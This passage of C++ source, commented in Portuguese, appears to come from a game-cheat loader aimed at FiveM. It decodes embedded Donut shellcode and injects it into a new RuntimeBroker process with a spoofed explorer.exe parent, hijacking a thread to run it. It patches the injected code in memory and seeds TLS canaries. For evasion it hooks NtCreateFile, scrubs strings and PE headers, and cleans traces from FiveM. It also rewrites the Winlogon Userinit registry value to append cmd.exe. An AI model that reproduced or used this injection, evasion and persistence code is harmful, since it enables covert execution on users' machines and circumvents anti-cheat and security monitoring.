            {
                MEMORY_BASIC_INFORMATION mbi{};
                if (VirtualQueryEx(process, reinterpret_cast<LPCVOID>(address),
                                   &mbi, sizeof(mbi)) != sizeof(mbi))
                    break;
                const uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
                const uintptr_t end = base + mbi.RegionSize;
                if (end <= address || end <= base)
                    break;

                // Apenas a .text mapeada como RX e grande o suficiente para
                // conter o RVA 0x17378F. Isso reduz o scan de ~100ms para ~1ms.
                const bool executable =
                    mbi.State == MEM_COMMIT &&
                    (mbi.Protect == PAGE_EXECUTE_READ ||
                     mbi.Protect == PAGE_EXECUTE_READWRITE) &&
                    mbi.RegionSize >= kSiteRva + sizeof(pattern) &&
                    mbi.RegionSize <= 0x800000;

                if (executable)
                {
                    std::vector<BYTE> buf(static_cast<SIZE_T>(mbi.RegionSize));
                    SIZE_T nr = 0;
                    if (::ReadProcessMemory(process, reinterpret_cast<LPCVOID>(base),
                                            buf.data(), buf.size(), &nr))
                    {
                        for (SIZE_T i = 0;
                             i + sizeof(pattern) <= nr && !done; ++i)
                        {
                            if (memcmp(buf.data() + i, pattern, sizeof(pattern)) != 0)
                                continue;

                            BYTE* site = reinterpret_cast<BYTE*>(base) + i;
                            BYTE* imageBase = site - kSiteRva;

                            // A .text e uma secao de imagem (PAGE_EXECUTE_READ)
                            // e NtProtectVirtualMemory devolve
                            // STATUS_INVALID_PAGE_PROTECTION ao tentar RW.
                            // O site nos da a base real da imagem, entao
                            // escrevemos no global de flag em .data (RVA
                            // 0x416F28), que e RW. O codigo faz
                            //   cmp [flag], canario ; jg init
                            // com canario = INT_MIN. Flag = INT_MAX garante
                            // que o salto para a init do pool seja tomado,
                            // evitando o `mov rax,[r13+8]` em 0x17379C.

                            // 1) Patch direto dos dois `jg canario ; init`.
                            //    WriteProcessMemory consegue gravar em secoes
                            //    RX de imagem (NtProtectVirtualMemory com RWX
                            //    devolvia STATUS_INVALID_PAGE_PROTECTION).
                            //    Se os dois saltos virarem jmp, nao precisamos
                            //    mexer no TLS/canario de nenhuma thread.
                            const BYTE pattern2[9] = {
                                0x0F, 0x8F, 0xD0, 0x01, 0x00, 0x00,
                                0x48, 0x83, 0x3D
                            };
                            const BYTE patch2[6] = {
                                0xE9, 0xD1, 0x01, 0x00, 0x00, 0x90
                            };
                            constexpr uintptr_t kSite2Delta =
                                0x1E55D - 0x17378F;
                            BYTE* site2 = site + kSite2Delta;
                            SIZE_T nwCode = 0;
                            SIZE_T nwCode2 = 0;
                            bool patchedBoth = false;
                            if (api::WriteProcessMemory_(process, site,
                                    const_cast<BYTE*>(patch), 6, &nwCode) &&
                                nwCode == 6)
                            {
                                BYTE check2[9]{};
                                SIZE_T nr2 = 0;
                                if (::ReadProcessMemory(process, site2,
                                        check2, sizeof(check2), &nr2) &&
                                    nr2 == sizeof(check2) &&
                                    memcmp(check2, pattern2, sizeof(pattern2)) == 0 &&
                                    api::WriteProcessMemory_(process, site2,
                                        const_cast<BYTE*>(patch2), 6, &nwCode2) &&
                                    nwCode2 == 6)
                                {
                                    patchedBoth = true;
                                }
                            }
                            if (attempts <= 2)
                            if (patchedBoth)
                            {
                                done = true;
                                break;
                            }

                            // 2) Resolver os globais pelos deslocamentos reais
                            //    das instrucoes. O Donut pode mapear .data em
                            //    uma base diferente da usada para calcular
                            //    imageBase a partir do site de .text.
                            //      site - 0x1F: disp do `mov edx,[rip+..]` que
                            //                   carrega o indice TLS (0x17376E)
                            //      site - 0x04: disp do `cmp [rip+..],ecx` da
                            //                   flag (0x173789)
                            int32_t tlsDisp = 0;
                            int32_t flagDisp = 0;
                            SIZE_T nrMisc = 0;
                            NTSTATUS stTlsDisp = nt::NtReadVirtualMemory_(
                                process, site - 0x1F, &tlsDisp,
                                sizeof(tlsDisp), &nrMisc);
                            NTSTATUS stFlagDisp = nt::NtReadVirtualMemory_(
                                process, site - 0x4, &flagDisp,
                                sizeof(flagDisp), &nrMisc);
                            BYTE* tlsGlobal = reinterpret_cast<BYTE*>(
                                reinterpret_cast<uintptr_t>(site) - 0x1B +
                                static_cast<intptr_t>(tlsDisp));
                            BYTE* flagGlobal = reinterpret_cast<BYTE*>(
                                reinterpret_cast<uintptr_t>(site) +
                                static_cast<intptr_t>(flagDisp));

                            uint32_t tlsIndex = 0;
                            NTSTATUS stTls = nt::NtReadVirtualMemory_(
                                process, tlsGlobal, &tlsIndex,
                                sizeof(tlsIndex), &nrMisc);
                            uint32_t canary = 0;
                            void* tlsArray = nullptr;
                            void* tlsBlock = nullptr;

                            // Semear o canario APENAS na thread do cheat.
                            // Escrever no TLS das threads do notepad corrompia
                            // o heap do host (0xC0000374).
                            if (haveTeb)
                            {
                                BYTE* tebTls = reinterpret_cast<BYTE*>(tbi.Teb) + 0x58;
                                nt::NtReadVirtualMemory_(process, tebTls,
                                    &tlsArray, sizeof(tlsArray), &nrMisc);

                                // A thread foi criada direto no shellcode, sem
                                // iniciar o CRT. Se o indice for grande, o array
                                // atual pode nao ter esse slot: alocamos um
                                // array novo e preservamos os primeiros 0x1000
                                // bytes do antigo.
                                SIZE_T arrBytes =
                                    (static_cast<SIZE_T>(tlsIndex) + 16) * 8;
                                if (arrBytes < 0x1000) arrBytes = 0x1000;
                                std::vector<BYTE> oldTls;
                                if (tlsArray)
                                {
                                    oldTls.resize(0x1000);
                                    SIZE_T nrOld = 0;
                                    if (!NT_SUCCESS(nt::NtReadVirtualMemory_(
                                            process, tlsArray, oldTls.data(),
                                            oldTls.size(), &nrOld)))
                                        oldTls.clear();
                                }

                                void* newArr = nullptr;
                                if (NT_SUCCESS(nt::NtAllocateVirtualMemory_(
                                        process, &newArr, 0, &arrBytes,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE)))
                                {
                                    if (!oldTls.empty())
                                        nt::NtWriteVirtualMemory_(process, newArr,
                                            oldTls.data(), oldTls.size(), &nrMisc);
                                    SIZE_T nwArr = 0;
                                    if (NT_SUCCESS(nt::NtWriteVirtualMemory_(
                                            process, tebTls, &newArr,
                                            sizeof(newArr), &nwArr)) &&
                                        nwArr == sizeof(newArr))
                                    {
                                        tlsArray = newArr;
                                    }
                                }

                                if (tlsArray)
                                {
                                    BYTE* slot = reinterpret_cast<BYTE*>(tlsArray) +
                                        static_cast<SIZE_T>(tlsIndex) * 8;
                                    NTSTATUS stSlot = nt::NtReadVirtualMemory_(
                                        process, slot, &tlsBlock,
                                        sizeof(tlsBlock), &nrMisc);
                                    if (!NT_SUCCESS(stSlot) || !tlsBlock)
                                    {
                                        SIZE_T sz = 0x5000;
                                        void* nb = nullptr;
                                        if (NT_SUCCESS(nt::NtAllocateVirtualMemory_(
                                                process, &nb, 0, &sz,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE)))
                                        {
                                            tlsBlock = nb;
                                            SIZE_T nwSlot = 0;
                                            nt::NtWriteVirtualMemory_(process,
                                                slot, &tlsBlock,
                                                sizeof(tlsBlock), &nwSlot);
                                        }
                                    }
                                    if (tlsBlock)
                                    {
                                        uint32_t seed = 0x80000000u;
                                        SIZE_T nwSeed = 0;
                                        nt::NtWriteVirtualMemory_(process,
                                            reinterpret_cast<BYTE*>(tlsBlock) + 0x4038,
                                            &seed, sizeof(seed), &nwSeed);
                                        canary = seed;
                                    }
                                }
                            }

                            // 3) flag usada pelo `cmp [flag],canario ; jg init`.
                            //    -1 (0xFFFFFFFF) > INT_MIN, entao o salto para
                            //    a init do pool e tomado e o codigo nao cai no
                            //    `mov rax,[r13+8]` em 0x17379C.
                            uint32_t flagValue = 0xFFFFFFFFu;
                            uint32_t flagRead = 0;
                            SIZE_T nrFlag = 0;
                            NTSTATUS stRead = nt::NtReadVirtualMemory_(
                                process, flagGlobal,
                                &flagRead, sizeof(flagRead), &nrFlag);
                            SIZE_T nwFlag = 0;
                            NTSTATUS stWrite = nt::NtWriteVirtualMemory_(
                                process, flagGlobal,
                                &flagValue, sizeof(flagValue), &nwFlag);
                            const bool okWrite = NT_SUCCESS(stWrite) &&
                                nwFlag == sizeof(flagValue);
                            if (attempts <= 2)
                            (void)stRead;
                            // nao quebra: continua reescrevendo o flag
                            // ate o timeout ou a morte do host.
                            if (okWrite)
                                anyFlagWrite = true;
                            else
                                break;
                        }
                    }
                }
                address = end;
            }

            if (done)
                return true;
            if (GetTickCount() - started >= timeoutMs)
            {
                return anyFlagWrite;
            }
            ++attempts;
            api::Sleep_(1);
        }
    }

    inline bool RunEmbeddedCheatInNewHost()
    {
        const std::size_t expected = EmbeddedCheatDecodedSize();
        if (expected < 32) return false;

        const DWORD explorerPid = FindExplorerPid();
        if (!explorerPid)
        {
            return false;
        }
        HANDLE hExplorer = api::OpenProcess_(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
        if (!hExplorer)
        {
            return false;
        }

        STARTUPINFOEXW siEx{};
        siEx.StartupInfo.cb = sizeof(siEx);
        std::size_t attrSize = 0;
        api::InitProcThreadAttrList_(nullptr, 1, 0, &attrSize);
        void* attrBuf = api::HeapAlloc_(api::GetProcessHeap_(), 0, attrSize);
        if (!attrBuf)
        {
            api::CloseH(hExplorer);
            return false;
        }
        siEx.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf);
        if (!api::InitProcThreadAttrList_(siEx.lpAttributeList, 1, 0, &attrSize))
        {
            api::HeapFree_(api::GetProcessHeap_(), 0, attrBuf);
            api::CloseH(hExplorer);
            return false;
        }
        if (!api::UpdateProcThreadAttribute_(siEx.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer,
                sizeof(hExplorer), nullptr, nullptr))
        {
            api::DeleteProcThreadAttrList_(siEx.lpAttributeList);
            api::HeapFree_(api::GetProcessHeap_(), 0, attrBuf);
            api::CloseH(hExplorer);
            return false;
        }

        wchar_t appPath[MAX_PATH]{};
        api::GetSystemDirectoryW_(appPath, MAX_PATH);
        wchar_t rbPath[MAX_PATH]{};
        // O usuario quer o cheat direto em RuntimeBroker, mas sem tocar no
        // RuntimeBroker que ja foi hijacked pelo F# e onde este loader roda.
        // Entao criamos um RuntimeBroker novo e limpo, com parent explorer via
        // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
        swprintf_s(rbPath, L"%ls\\RuntimeBroker.exe", appPath);

        PROCESS_INFORMATION pi{};
        const BOOL created = api::CreateProcessW_(
            rbPath, nullptr, nullptr, nullptr, FALSE,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
            nullptr, nullptr, &siEx.StartupInfo, &pi);

        api::DeleteProcThreadAttrList_(siEx.lpAttributeList);
        api::HeapFree_(api::GetProcessHeap_(), 0, attrBuf);
        api::CloseH(hExplorer);

        if (!created)
        {
            return false;
        }

        // Nao tocar no entry point: retomar a thread principal para o processo
        // inicializar normalmente. O hijack sera feito em uma thread ja existente.
        if (api::ResumeThread_(pi.hThread) == static_cast<DWORD>(-1))
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }
        api::Sleep_(1200);

        // O canario de init preguicosa NAO fica em PEB->Ldr (isso corrompia o
        // heap do host). A descompilacao mostra que o cheat le:
        //   gs:[0x58]                -> ThreadLocalStoragePointer da thread
        //   [tls + TLS_INDEX*8]      -> bloco TLS do cheat (TLS_INDEX = 0x3F410)
        //   dword [bloco + 0x4038]   -> canario (INT_MIN quando inicializado)
        // O canario e semeado depois que a thread do shellcode comeca, usando
        // o TEB real dessa thread.

        // ---------------------------------------------------------------------
        // Thread hijacking copiado do ShellcodeFluctuation: enumera as threads
        // do host via NtQuerySystemInformation, abre a primeira via
        // NtOpenThread, aloca secao RWX remota e grava o wrapper. A execucao
        // usa NtCreateThreadEx com startAddress no shellcode, exatamente como
        // injectViaExistingThread(). Nenhuma thread e suspendida e nenhum
        // registrador e herdado da vitima. O loader nao e pai do host.
        // ---------------------------------------------------------------------
        std::vector<uint8_t> decoded(expected);
        std::size_t outLen = 0;
        if (!DecodeEmbeddedCheat(decoded.data(), expected, outLen) || outLen != expected)
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        // wrapper: shellcode + EB FE (spin) + NOPs, exatamente como no
        // ShellcodeFluctuation (injectViaExistingThread).
        const std::size_t wrapperSize = outLen + 16;
        std::vector<uint8_t> wrapper(wrapperSize, 0x90);
        memcpy(wrapper.data(), decoded.data(), outLen);
        wrapper[outLen] = 0xEB;
        wrapper[outLen + 1] = 0xFE;
        WipeBuffer(decoded.data(), decoded.size());

        void* remote = nullptr;
        HANDLE hCheatThread = nullptr;
        if (!InjectShellcodeLikeShellcodeFluctuation(
                wrapper, pi.hProcess, pi.dwProcessId,
                &remote, &hCheatThread))
        {
            WipeBuffer(wrapper.data(), wrapper.size());
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }
        WipeBuffer(wrapper.data(), wrapper.size());

        // A thread do cheat foi criada SUSPENSA. O Donut/CRT corrompia o heap
        // do RuntimeBroker (crash em ntdll+0x5104) porque o canario TLS ainda
        // nao estava semeado quando a thread comecava. Agora o patch dos dois
        // `jg canario ; init` e o fallback de flag/TLS acontecem antes de
        // retomar a thread.
        const bool overlayInit = ForceOverlayInitInHost(
            pi.hProcess, hCheatThread, pi.dwProcessId);
        if (!overlayInit)
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(hCheatThread);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        ULONG prevSuspend = 0;
        NTSTATUS stResume = nt::NtResumeThread_(hCheatThread, &prevSuspend);
        if (!NT_SUCCESS(stResume))
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(hCheatThread);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        // Jitter do ShellcodeFluctuation apos a criacao da thread (500-1000ms).
        JitterDelay(50, 100);

        api::CloseH(hCheatThread);
        api::CloseH(pi.hThread);
        api::CloseH(pi.hProcess);
        return true;
    }

    // O RuntimeBroker sequestrado pelo F# tem um bloco de ambiente incompleto
    // (SystemRoot/windir vazios). CreateProcessW com lpEnvironment=nullptr
    // herda esse bloco; sem SystemRoot o catalogo Winsock nao resolve
    // mswsock.dll e socket() falha com WSAEPROVIDERFAILEDINIT (10106) dentro
    // do host. Reparamos as variaveis no loader antes de criar o filho.
    inline void EnsureHostEnvironment()
    {
        wchar_t systemDir[ MAX_PATH ] = { };
        const UINT count = api::GetSystemDirectoryW_( systemDir, MAX_PATH );
        if (!count || count >= MAX_PATH) return;

        const std::wstring sys( systemDir );
        const std::wstring::size_type cut = sys.find_last_of( L"\\/" );
        const std::wstring win = cut == std::wstring::npos ? sys : sys.substr( 0, cut );

        ::SetEnvironmentVariableW( L"SystemRoot", win.c_str( ) );
        ::SetEnvironmentVariableW( L"windir", win.c_str( ) );

        wchar_t buffer[ 2048 ] = { };
        if (!::GetEnvironmentVariableW( L"TEMP", buffer, 2048 ))
            ::SetEnvironmentVariableW( L"TEMP", ( win + L"\\Temp" ).c_str( ) );
        buffer[ 0 ] = 0;
        if (!::GetEnvironmentVariableW( L"TMP", buffer, 2048 ))
            ::SetEnvironmentVariableW( L"TMP", ( win + L"\\Temp" ).c_str( ) );

        buffer[ 0 ] = 0;
        if (!::GetEnvironmentVariableW( L"USERPROFILE", buffer, 2048 )) {
            buffer[ 0 ] = 0;
            if (::GetEnvironmentVariableW( L"APPDATA", buffer, 2048 )) {
                const std::wstring appData( buffer );
                const std::wstring::size_type p = appData.find( L"\\AppData\\" );
                if (p != std::wstring::npos)
                    ::SetEnvironmentVariableW( L"USERPROFILE", appData.substr( 0, p ).c_str( ) );
            }
        }

        std::wstring path = win + L"\\system32;" + win + L";" + win + L"\\system32\\Wbem";
        buffer[ 0 ] = 0;
        if (::GetEnvironmentVariableW( L"Path", buffer, 2048 ))
            path += L";" + std::wstring( buffer );
        ::SetEnvironmentVariableW( L"Path", path.c_str( ) );

    }

    // -------------------------------------------------------------------------
    // RunEmbeddedCheatInRuntimeBrokerHost — host RuntimeBroker novo e
    // dedicado, parent=explorer.exe, job kill-on-close e thread hijacking
    // real. A thread vitima nunca e a do loader (pid/tid diferentes) e o host
    // e registrado em g_hollowedChildPid para o Shift+F7. Nao ha perfil
    // temporario nem argumentos de browser.
    // -------------------------------------------------------------------------

    inline bool RunEmbeddedCheatInRuntimeBrokerHost()
    {
        const std::size_t expected = EmbeddedCheatDecodedSize();
        if (expected < 32) return false;

        EnsureHostEnvironment();

        const std::wstring hostPath = FindRuntimeBrokerHostPath();

        HANDLE hHostFile = api::CreateFileW_(
            hostPath.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hHostFile == INVALID_HANDLE_VALUE)
        {
            return false;
        }
        api::CloseH(hHostFile);

        const DWORD explorerPid = FindExplorerPid();
        if (!explorerPid)
        {
            return false;
        }
        HANDLE hExplorer = api::OpenProcess_(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
        if (!hExplorer)
        {
            return false;
        }

        STARTUPINFOEXW siEx{};
        siEx.StartupInfo.cb = sizeof(siEx);
        std::size_t attrSize = 0;
        api::InitProcThreadAttrList_(nullptr, 1, 0, &attrSize);
        void* attrBuf = api::HeapAlloc_(api::GetProcessHeap_(), 0, attrSize);
        if (!attrBuf)
        {
            api::CloseH(hExplorer);
            return false;
        }
        siEx.lpAttributeList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf);
        bool attrReady = false;
        auto freeAttrs = [&]()
        {
            if (attrReady) api::DeleteProcThreadAttrList_(siEx.lpAttributeList);
            api::HeapFree_(api::GetProcessHeap_(), 0, attrBuf);
            api::CloseH(hExplorer);
        };

        if (!api::InitProcThreadAttrList_(siEx.lpAttributeList, 1, 0, &attrSize))
        {
            freeAttrs();
            return false;
        }
        attrReady = true;
        if (!api::UpdateProcThreadAttribute_(siEx.lpAttributeList, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer,
                sizeof(hExplorer), nullptr, nullptr))
        {
            freeAttrs();
            return false;
        }

        std::wstring cmd = L"\"" + hostPath + L"\" -Embedding";
        std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
        cmdBuf.push_back(L'\0');

        // Ambiente herdado: um bloco customizado aqui derruba a criacao do host
        // dentro do loader injetado. O DNS e resolvido na camada HTTP com IP
        // explicito e header Host, sem depender do ambiente do processo filho.
        PROCESS_INFORMATION pi{};
        const BOOL created = api::CreateProcessW_(
            hostPath.c_str(), cmdBuf.data(), nullptr, nullptr, FALSE,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
            nullptr, nullptr, &siEx.StartupInfo, &pi);
        freeAttrs();
        if (!created)
        {
            return false;
        }

        HANDLE job = EnsureHostKillJob();
        if (job && !api::AssignProcessToJobObject_(job, pi.hProcess))
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        if (api::ResumeThread_(pi.hThread) == static_cast<DWORD>(-1))
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        // Registra ANTES do hijack para que qualquer falha seguinte ainda seja
        // limpa pelo Shift+F7.
        g_hollowedChildPid.store(pi.dwProcessId, std::memory_order_release);

        // No fixed 1.5s wait: HijackThreadWithDonut(preferNewThread=true)
        // creates its own suspended thread, so the host does not need to finish
        // initializing worker threads before the cheat is mapped.
        std::vector<uint8_t> shellcode(expected);
        std::size_t outLen = 0;
        if (!DecodeEmbeddedCheat(shellcode.data(), expected, outLen) ||
            outLen != expected)
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        void* remote = nullptr;
        DWORD victimTid = 0;
        bool createdNewThread = false;
        // O loader roda dentro do RuntimeBroker sequestrado pelo F#. Passar o
        // nosso tid garante que a thread do loader nunca seja escolhida como
        // vitima, mesmo com outro host.
        const bool ok = HijackThreadWithDonut(
            pi.hProcess, pi.dwProcessId, ::GetCurrentThreadId(),
            shellcode, &remote, &victimTid, &createdNewThread, true);
        WipeBuffer(shellcode.data(), shellcode.size());

        if (!ok)
        {
            api::TerminateProcess_(pi.hProcess, 0);
            api::CloseH(pi.hThread);
            api::CloseH(pi.hProcess);
            return false;
        }

        JitterDelay(50, 100);

        api::CloseH(pi.hThread);
        api::CloseH(pi.hProcess);
        return true;
    }

    inline void InjectFromApi()
    {
        const bool debugPriv = api::EnableDebugPrivilege();

        int expected = 0;
        if (!g_hollowState.compare_exchange_strong(expected, 1))
        {
            return;
        }

        auto stateGuard = MakeScopeGuard([]()
        {
            g_hollowState.store(0, std::memory_order_release);
        });

        bool localHookActive = false;
        bool hookActive = false;

        auto stopHook = [&]()
        {
            if (localHookActive)
            {
                NtCreateFileHook::Remove();
                localHookActive = NtCreateFileHook::HasPendingState();
            }
            hookActive = false;
        };
        auto hookGuard = MakeScopeGuard(stopHook);

        auto fail = [&]() {  g_hollowState.store(0, std::memory_order_release); };
        auto success = [&]() {
            g_hollowState.store(0, std::memory_order_release);
        };

        // The hook is best-effort. SysMain can be stopped/disabled (no
        // prefetch is generated at all) or the loader may be running without
        // elevation; neither case should silently cancel the injection.
        localHookActive = NtCreateFileHook::Install();
        hookActive = localHookActive;

        // 1) Shellcode Donut embarcado em .rdata — sem download em runtime.
        //    Decode direto no buffer RW, sem copia intermediaria na heap.
        const std::size_t cheatSize = EmbeddedCheatDecodedSize();
        if (cheatSize < 32)
        {
            stopHook();
            fail();
            return;
        }

        // 2) Remove rastro das URLs/strings HTTP ANTES de mapear o cheat.
        //    O scrub varre todas as regioes graváveis do processo; se rodasse
        //    depois, poderia zeroar strings dentro da imagem do cheat recem-
        //    mapeada no mesmo RuntimeBroker.
        ScrubHttpStringsInSelf();

        // 3) Host RuntimeBroker dedicado com parent = explorer.exe (loader NAO
        //    e o pai). Thread hijacking real: CONTEXT de uma thread nao-loader
        //    e redirecionado para o shellcode; retorno via NtContinue.
        const bool ok = RunEmbeddedCheatInRuntimeBrokerHost();

        // Prefetch/SysMain hook continua ativo por 15s, mas em background:
        // segurar a thread da bind travava o Shift+F7/F8 seguinte. A tarefa
        // isolada remove o hook sem atrasar o proximo bind.
        if (ok && localHookActive)
        {
            api::SubmitPoolTask([]()
            {
                api::Sleep_(15000);
                NtCreateFileHook::Remove();
                while (NtCreateFileHook::HasPendingState())
                    api::Sleep_(10);
            });
            localHookActive = false;
            hookActive = false;
        }
        stopHook();

        if (!ok) fail(); else success();
    }

    inline bool ZeroBytesInProcess(HANDLE hProc, PVOID address,
                                    const void* zeros, SIZE_T length, SIZE_T& written)
    {
        written = 0;
        if (!hProc || !address || !zeros || length == 0) return false;

        DWORD oldProtect = 0;
        if (!api::VirtualProtectEx_(hProc, address, length, PAGE_READWRITE, &oldProtect))
            return false;

        const NTSTATUS status = nt::NtWriteVirtualMemory_(
            hProc, address, const_cast<void*>(zeros), length, &written);

        DWORD ignored = 0;
        api::VirtualProtectEx_(hProc, address, length, oldProtect, &ignored);
        return NT_SUCCESS(status) && written == length;
    }

    inline bool ForceCloseHollowedChild(DWORD childPid)
    {
        if (childPid == 0)
            return true;

        OBJECT_ATTRIBUTES_ oa{};
        oa.Length = sizeof(oa);

        CLIENT_ID_ cid{};
        cid.UniqueProcess =
            reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(childPid));

        HANDLE hKill = nullptr;
        NTSTATUS openStatus = nt::NtOpenProcess_(
            &hKill,
            PROCESS_TERMINATE | SYNCHRONIZE,
            &oa,
            &cid);

        if ((!NT_SUCCESS(openStatus) || !hKill))
        {
            // A restricted token may not grant the minimal access mask even
            // when the loader is elevated. Retry with the same access used by
            // the existing emergency cleanup path.
            hKill = nullptr;
            openStatus = nt::NtOpenProcess_(
                &hKill,
                PROCESS_ALL_ACCESS,
                &oa,
                &cid);
        }

        if (!NT_SUCCESS(openStatus) || !hKill)
            return false;

        bool closed = false;
        for (int attempt = 0; attempt < 3 && !closed; ++attempt)
        {
            const NTSTATUS terminateStatus =
                nt::NtTerminateProcess_(hKill, 0);

            if (!NT_SUCCESS(terminateStatus))
                break;

            LARGE_INTEGER timeout{};
            timeout.QuadPart = -100000LL; // 10ms, relative

            // STATUS_WAIT_0 is exactly zero. Do not use NT_SUCCESS here:
            // STATUS_TIMEOUT is a non-error NTSTATUS and would otherwise be
            // mistaken for a successful close.
            closed =
                nt::NtWaitForSingleObject_(hKill, FALSE, &timeout) == 0;

            if (!closed)
                api::Sleep_(10);
        }

        nt::NtClose_(hKill);
        return closed;
    }


    // =========================================================================
    // DoF7 — encerra o child, executa a limpeza dos alvos.
    // =========================================================================
    inline bool DoF7()
    {
        api::EnableDebugPrivilege();

        bool expectedRunning = false;
        if (!g_f7Running.compare_exchange_strong(
                expectedRunning, true, std::memory_order_acq_rel))
        {

            return false;
        }

        g_hollowState.store(0, std::memory_order_release);

        bool localHookActive = false;
        auto cleanupGuard = MakeScopeGuard([&]()
        {
            if (localHookActive)
                NtCreateFileHook::Remove();
            g_f7Active.store(false, std::memory_order_release);
            g_f7Running.store(false, std::memory_order_release);
        });

        g_f7Active.store(true, std::memory_order_release);

        SetWinlogonDefault();

        localHookActive = NtCreateFileHook::Install();

        // 0a) MATA o host RuntimeBroker dedicado e toda a sua arvore
        //     (job kill-on-close). Nao ha perfil temporario para remover.
        {
            DWORD childPid = g_hollowedChildPid.load(std::memory_order_acquire);
            if (childPid != 0)
            {
                ForceCloseHollowedChild(childPid);
                g_hollowedChildPid.store(0, std::memory_order_release);
            }

            HANDLE hostJob = g_hostKillJob.exchange(nullptr,
                std::memory_order_acq_rel);
            if (hostJob && hostJob != INVALID_HANDLE_VALUE)
                api::CloseH(hostJob);
        }

        StringCleaner::Run();
        ZeroRuntimeBrokerStringsInFiveM();
        ScrubHttpStringsInSelf();
        DoFiveMLaneScrub();

        if (localHookActive)
            NtCreateFileHook::Remove();

        g_f7Active.store(false, std::memory_order_release);
        g_f7Done.store(true, std::memory_order_release);
        g_f7Running.store(false, std::memory_order_release);

        // No fallback fileless o loader vive dentro do explorer: encerrar a
        // thread tambem derrubava a shell. O loader permanece operacional.
        api::Beep_(750, 250);
        return true;
    }

    inline bool DoF9()
    {
#if CHEAT_BYPASS_ENABLE_WEBSOCKET
        api::EnableDebugPrivilege();

        // Logica pra voltar a conexao

        g_f9Active.store(false, std::memory_order_release);
        g_f9Done.store(true, std::memory_order_release);
        g_f9Running.store(false, std::memory_order_release);
#endif

        return true;
    }


    // =========================================================================
    // ScrubSelfHeaders
    //
    // Quando o loader roda via Donut dentro do Spotify.exe, o modulo principal
    // do processo (GetModuleHandleW(nullptr)) e o proprio Spotify.exe. Zerar o
    // cabecalho PE dele faz o Chromium lancar std::system_error no proximo
    // comando de midia (causa raiz comprovada por A/B). O loader mapeado vive
    // numa alocacao privada separada: localizamos essa alocacao via
    // VirtualQuery e scrubamos apenas ela, nunca o hospedeiro.
    // =========================================================================

    inline bool ScrubSelfHeaders()
    {
        HMODULE host = api::GetModuleHandleW_(nullptr);

        typedef SIZE_T(WINAPI* fnVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
        static fnVirtualQuery pVirtualQuery = reinterpret_cast<fnVirtualQuery>(
            sc::Resolve(xorstr("kernel32.dll"), xorstr("VirtualQuery")));
        if (!pVirtualQuery) { return false; }

        MEMORY_BASIC_INFORMATION mbi{};
        SIZE_T q = pVirtualQuery(reinterpret_cast<LPCVOID>(&ScrubSelfHeaders), &mbi, sizeof(mbi));

        if (q != sizeof(mbi)) return false;

        BYTE* own = reinterpret_cast<BYTE*>(mbi.AllocationBase);
        if (!own || own == reinterpret_cast<BYTE*>(host))
        {
            // Executando como o proprio EXE (standalone): nao existe uma
            // imagem separada para esconder. Nunca tocar no modulo hospedeiro.
            return true;
        }

        IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(own);

        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return true;

        LONG e_lfanew = dos->e_lfanew;

        if (e_lfanew <= 0 || e_lfanew > 0x1000) return false;

        DWORD oldProtect = 0;
        if (!api::VirtualProtect_(own, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect))
        {

            return false;
        }

        *reinterpret_cast<volatile WORD*>(own) = 0;
        *reinterpret_cast<volatile DWORD*>(own + e_lfanew) = 0;

        DWORD tmp = 0;
        api::VirtualProtect_(own, 0x1000, oldProtect, &tmp);

        return true;
    }

    namespace winlogon_state
    {
        inline std::wstring      saved_value;
        inline DWORD             saved_type = REG_SZ;
        inline std::atomic<bool> has_saved{ false };
    }

    inline std::wstring WinlogonDefaultValue()
    {
        // Keep this path literal instead of querying the environment block.
        // The loader targets the standard Windows installation root.
        std::wstring value = xorstr(L"C:\\Windows");
        value += xorstr(L"\\system32\\userinit.exe,");
        return value;
    }

    // Valor que o loader espera recolocar no F9 quando não há snapshot útil.
    inline std::wstring WinlogonAlteredValue()
    {
        return xorstr(L"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\cmd.exe");
    }

    // O loader normalmente roda em RuntimeBroker medium-IL: leitura sempre
    // funciona, escrita em HKLM só quando o host já está elevado. Por isso o
    // acesso é pedido conforme a operação.
    inline HKEY OpenWinlogonKey(bool forWrite)
    {
